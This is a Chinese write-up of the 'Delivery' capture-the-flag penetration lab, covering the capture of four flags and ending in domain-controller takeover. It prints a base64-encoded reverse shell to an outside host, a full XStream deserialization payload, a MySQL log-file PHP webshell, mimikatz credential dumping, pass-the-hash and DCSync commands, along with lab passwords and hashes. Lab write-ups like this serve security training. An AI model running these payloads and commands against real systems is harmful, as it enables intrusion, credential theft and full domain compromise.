# 春秋云境-Delivery综合渗透


春秋云境-Delivery综合渗透通关wp

<!--more-->

![image-20250218215243576](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218215243576.png?imageSlim)

靶标介绍：

在这个靶场中，您将扮演一名渗透测试工程师，受雇于一家名为 Delivery 的小型科技初创公司，并对该公司进行一次渗透测试。你的目标是成功获取域控制器权限，以评估公司的网络安全状况。该靶场共有 4 个 Flag，分布于不同的靶机。

## flag01

> 关卡剧情：请测试 Delivery 暴露在公网上的 Web 应用的安全性，并尝试获取在该服务器上执行任意命令的能力。

起手fscan

```bash
E:\Tools\web\fscan_1.8.4>fscan.exe -h 39.99.144.189

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
39.99.144.189:21 open
39.99.144.189:8080 open
39.99.144.189:22 open
39.99.144.189:80 open
[*] alive ports len is: 4
start vulscan
[*] WebTitle http://39.99.144.189      code:200 len:10918  title:Apache2 Ubuntu Default Page: It works
[+] ftp 39.99.144.189:21:anonymous
   [->]1.txt
   [->]pom.xml
[*] WebTitle http://39.99.144.189:8080 code:200 len:3655   title:公司发货单
已完成 4/4
```

发现了一个匿名ftp和一个web

先把ftp文件下载下来

在pox.xml里发现了 版本在1.4.16的xstream 这个版本是有个反序列化漏洞的

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250217122916-dckckm4.png?imageSlim)​

http://39.99.144.189:8080是一个web页面

抓包看一下，发现是xml格式传输

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250217123607-tceskw8.png?imageSlim)​

CVE-2021-29505 配合 CommonsCollections的链子即可拿到shell

用ysoserial 选择 CommonsCollections6链子即可反弹成功

在vps上使用ysoserial的JRMPListener启动一个恶意的RMI Registry：

```bash
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8zOS4xMDYuNzUuMzcvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}"
```

发包，打payload

```bash
POST /just_sumbit_it HTTP/1.1
Host: 39.99.159.98:8080
Content-Length: 3119
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: application/xml, text/xml, */*; q=0.01
Content-Type: application/xml;charset=UTF-8
Origin: http://39.99.159.98:8080
Referer: http://39.99.159.98:8080/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

<java.util.PriorityQueue serialization='custom'>
    <unserializable-parents/>
    <java.util.PriorityQueue>
        <default>
            <size>2</size>
        </default>
        <int>3</int>
        <javax.naming.ldap.Rdn_-RdnEntry>
            <type>12345</type>
            <value class='com.sun.org.apache.xpath.internal.objects.XString'>
                <m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content</m__obj>
            </value>
        </javax.naming.ldap.Rdn_-RdnEntry>
        <javax.naming.ldap.Rdn_-RdnEntry>
            <type>12345</type>
            <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>
                <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>
                    <parsedMessage>true</parsedMessage>
                    <soapVersion>SOAP_11</soapVersion>
                    <bodyParts/>
                    <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>
                        <attachmentsInitialized>false</attachmentsInitialized>
                        <nullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>
                            <aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'>
                                <candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'>
                                    <names>
                                        <string>aa</string>
                                        <string>aa</string>
                                    </names>
                                    <ctx>
                                        <environment/>
                                        <registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'>
                                            <java.rmi.server.RemoteObject>
                                                <string>UnicastRef</string>
                                                <string>39.106.75.37</string>
                                                <int>1099</int>
                                                <long>0</long>
                                                <int>0</int>
                                                <long>0</long>
                                                <short>0</short>
                                                <boolean>false</boolean>
                                            </java.rmi.server.RemoteObject>
                                        </registry>
                                        <host>39.106.75.37</host>
                                        <port>1099</port>
                                    </ctx>
                                </candidates>
                            </aliases>
                        </nullIter>
                    </sm>
                </message>
            </value>
        </javax.naming.ldap.Rdn_-RdnEntry>
    </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

‍

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250217132251-rxqrumf.png?imageSlim)​

再起一个9999端口的监听

```bash
nc -lvvp 9999
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250217132410-vlhyl3d.png?imageSlim)​

读flag

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250217132417-9fatqek.png?imageSlim)​

## flag02

> 关卡剧情：为了实现跨机器和跨操作系统的文件共享，管理员在内网部署了 NFS，然而这个决策却使得该服务器陷入了潜在的安全风险。你的任务是尝试获取该服务器的控制权，以评估安全性。

ifconfig

```bash
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.22.13.14  netmask 255.255.0.0  broadcast 172.22.255.255
        inet6 fe80::216:3eff:fe0a:9ba5  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:0a:9b:a5  txqueuelen 1000  (Ethernet)
        RX packets 91569  bytes 123849696 (123.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 26861  bytes 3630089 (3.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 512  bytes 44515 (44.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 512  bytes 44515 (44.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

上传fscan并扫描

```bash
root@ubuntu:/# ./fscan -h 172.22.13.14/24
./fscan -h 172.22.13.14/24

   ___                              _  
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <  
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.22.13.14    is alive
(icmp) Target 172.22.13.6     is alive
(icmp) Target 172.22.13.28    is alive
(icmp) Target 172.22.13.57    is alive
[*] Icmp alive hosts len is: 4
172.22.13.28:3306 open
172.22.13.28:445 open
172.22.13.6:88 open
172.22.13.6:445 open
172.22.13.28:139 open
172.22.13.6:139 open
172.22.13.6:135 open
172.22.13.14:21 open
172.22.13.28:80 open
172.22.13.57:80 open
172.22.13.57:22 open
172.22.13.14:80 open
172.22.13.14:22 open
172.22.13.28:135 open
172.22.13.14:8080 open
172.22.13.28:8000 open
[*] alive ports len is: 16
start vulscan
[*] WebTitle http://172.22.13.14       code:200 len:10918  title:Apache2 Ubuntu Default Page: It works
[*] NetInfo 
[*]172.22.13.6
   [->]WIN-DC
   [->]172.22.13.6
[*] NetInfo 
[*]172.22.13.28
   [->]WIN-HAUWOLAO
   [->]172.22.13.28
[*] WebTitle http://172.22.13.57       code:200 len:4833   title:Welcome to CentOS
[*] WebTitle http://172.22.13.28       code:200 len:2525   title:欢迎登录OA办公平台
[*] NetBios 172.22.13.6     [+] DC:XIAORANG\WIN-DC       
[*] NetBios 172.22.13.28    WIN-HAUWOLAO.xiaorang.lab           Windows Server 2016 Datacenter 14393
[+] ftp 172.22.13.14:21:anonymous 
   [->]1.txt
   [->]pom.xml
[*] WebTitle http://172.22.13.28:8000  code:200 len:170    title:Nothing Here.
[*] WebTitle http://172.22.13.14:8080  code:200 len:3655   title:公司发货单
[+] mysql:172.22.13.28:3306:root 123456
已完成 16/16
```

第二关提示有nfs，扫描一下2049端口

```bash
root@ubuntu:/# ./fscan -h 172.22.13.0/24 -p 2049
./fscan -h 172.22.13.0/24 -p 2049

   ___                              _  
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <  
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.22.13.14    is alive
(icmp) Target 172.22.13.6     is alive
(icmp) Target 172.22.13.28    is alive
(icmp) Target 172.22.13.57    is alive
[*] Icmp alive hosts len is: 4
172.22.13.57:2049 open
[*] alive ports len is: 1
start vulscan
已完成 1/1
[*] 扫描结束,耗时: 3.008347518s

```

查看匿名nfs文件列表

```bash
showmount -e 172.22.13.57
```

靶机上下载nfs_offline

```bash
wget http://archive.ubuntu.com/ubuntu/pool/main/n/nfs-utils/nfs-common_1.3.4-2.5ubuntu3_amd64.deb
wget http://archive.ubuntu.com/ubuntu/pool/main/libn/libnfsidmap/libnfsidmap2_0.25-5.1ubuntu1_amd64.deb
wget http://archive.ubuntu.com/ubuntu/pool/main/libt/libtirpc/libtirpc3_1.2.5-1_amd64.deb
wget http://archive.ubuntu.com/ubuntu/pool/main/r/rpcbind/rpcbind_1.2.5-8_amd64.deb
wget http://archive.ubuntu.com/ubuntu/pool/main/k/keyutils/keyutils_1.6-6ubuntu1_amd64.deb
wget http://archive.ubuntu.com/ubuntu/pool/main/libt/libtirpc/libtirpc-common_1.2.5-1_all.deb
sudo dpkg -i libnfsidmap2_0.25-5.1ubuntu1_amd64.deb && \
sudo dpkg -i libtirpc-common_1.2.5-1_all.deb && \
sudo dpkg -i libtirpc3_1.2.5-1_amd64.deb && \
sudo dpkg -i rpcbind_1.2.5-8_amd64.deb && \
sudo dpkg -i keyutils_1.6-6ubuntu1_amd64.deb && \
sudo dpkg -i nfs-common_1.3.4-2.5ubuntu3_amd64.deb
```

随后

```bash
showmount -e 172.22.13.57
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250217160639-4g1tzmw.png?imageSlim)​

```bash
mkdir temp
mount -t nfs 172.22.13.57:/ ./temp -o nolock
```

写入ssh公钥

```bash
ssh-keygen -t rsa -b 4096
cd /temp/home/joyce/
mkdir .ssh
cat /root/.ssh/id_rsa.pub >> /temp/home/joyce/.ssh/authorized_keys
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250217161256-kxiv2hl.png?imageSlim)​

私钥连接ssh，起一个交互shell

```bash
ssh -i /root/.ssh/id_rsa joyce@172.22.13.57
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250217163521-f3b0zdu.png?imageSlim)​

没有权限

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250217163543-uwdmi0p.png?imageSlim)​

发现pAss.txt，先读一下，是个域内用户

```bash
xiaorang.lab/zhangwen\QT62f3gBhK1
```

suid提权

```bash
find / -user root -perm -4000 -print 2>/dev/null
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250217165632-eujmjj1.png?imageSlim)​

发现ftp有权限

回到172.22.13.14起ftp服务

```bash
exit

python3 -m pyftpdlib -p 6666 -u test -P test -w & 
```

再连回去

```bash
ssh  -i /root/.ssh/id_rsa joyce@172.22.13.57 

ftp 172.22.13.14 6666

put /flag02.txt
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250217165750-p39hwpr.png?imageSlim)​

exit回到172.22.13.14获得flag02

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250217165832-ho378uv.png?imageSlim)​

## flag03

```bash
关卡剧情：请尝试获取内网中运行 OA 系统的服务器权限，并获取该服务器上的机密文件。
```

在172.22.13.14后台起一下fprc

```bash
./frpc -c ./frpc.ini &
```

vps起frps

```bash
./frps -c ./frps.ini
```

配好proxifier规则

在本机用navicat连一下数据库

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250217171254-ybmfi6p.png?imageSlim)​

测试一下，发现可以读文件

```bash
select load_file('C://windows//win.ini');
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250217171707-84qzyyn.png?imageSlim)​

直接读flag

```bash
select load_file('C:\\users\\administrator\\flag\\flag03.txt');
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250217171613-pj75izc.png?imageSlim)​

## flag04

> 关卡剧情：由于域管理员错误的配置，导致域内某个用户拥有危险的 DACL。你的任务是找到该用户，并评估这个配置错误所带来的潜在危害。

mysql的机器也是dc机，尝试把文件导入到web路径下getshell

```bash
mysql> SET GLOBAL general_log='on';

mysql> SET GLOBAL general_log_file='C:\\phpstudy_pro\\WWW\\1.php';

mysql> SELECT '<?php @eval($_POST[1]);?>';
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250217171947-3u74526.png?imageSlim)​

蚁剑连接

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250217172028-zqx5n50.png?imageSlim)​

修改下管理员密码，远程上去

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250217172145-ivauzix.png?imageSlim)​

rdp连过去

上传猕猴桃抓下密码

```bash
privilege::debug
sekurlsa::logonpasswords
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250217181646-24j55g5.png?imageSlim)​

拿到了chenglei的密码

```bash
* Username : chenglei
* Domain   : XIAORANG.LAB
* Password : Xt61f3LBhg1
```

抓到机器用户的NTLM哈希

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250217173043-d1s11z6.png?imageSlim)​

打pth拿到SYSTEM

```bash
sekurlsa::pth /user:WIN-HAUWOLAO$ /domain:XIAORANG.LAB /ntlm:e1fc593b8d8e0be2cc96407da1eba4a5
```

在kali上使用BloodHound搜集一下信息

账号和密码是之前读的pAss.txt

```bash
bloodhound-python -u zhangwen -p 'QT62f3gBhK1' -d xiaorang.lab -c all -ns 172.22.13.6 --zip --dns-tcp
```

分析一下chenglei的权限

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250217180035-e5ne2if.png?imageSlim)​

chenglei 属于 ACL ADMIN 组，ACL Admins 组对 WIN-DC 具有 WriteDacl 权限，那么可以直接写 DCSync / RBCD / Shadow Credentials

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250217180223-wrtuako.png?imageSlim)​

WriteDacl 写 RBCD

[https://github.com/fortra/impacket](https://github.com/fortra/impacket)​

在kali：

```bash
python dacledit.py xiaorang.lab/chenglei -hashes :0c00801c30594a1b8eaa889d237c5382 -action write -rights DCSync -principal chenglei -target-dn 'DC=xiaorang,DC=lab' -dc-ip 172.22.13.6
```

用之前抓到的 ntml 修改 acl，让他拥有 DCSync 权限

利用 DCSync 导出域控的凭据

```bash
python3 secretsdump.py  xiaorang.lab/chenglei@172.22.13.6 -hashes :0c00801c30594a1b8eaa889d237c5382  -just-dc-user administrator
```

‍

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6341235defdaed66fb7b682665752c9a::: 
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:d0f9c9b1bea5b90f9547952d2009bda6e1aab23ff2862bf9afb2be793709f0cd
Administrator:aes128-cts-hmac-sha1-96:afeaadd6987386ed1e8938fb9e167e6c
Administrator:des-cbc-md5:cb584c08e308a4ae
```

‍

然后 PTH 拿到 flag

```bash
python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:6341235defdaed66fb7b682665752c9a administrator@172.22.13.6
```

‍

```bash
type C:\Users\Administrator\flag\flag04.txt
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250217180719-89tn2pz.png?imageSlim)​

‍

‍

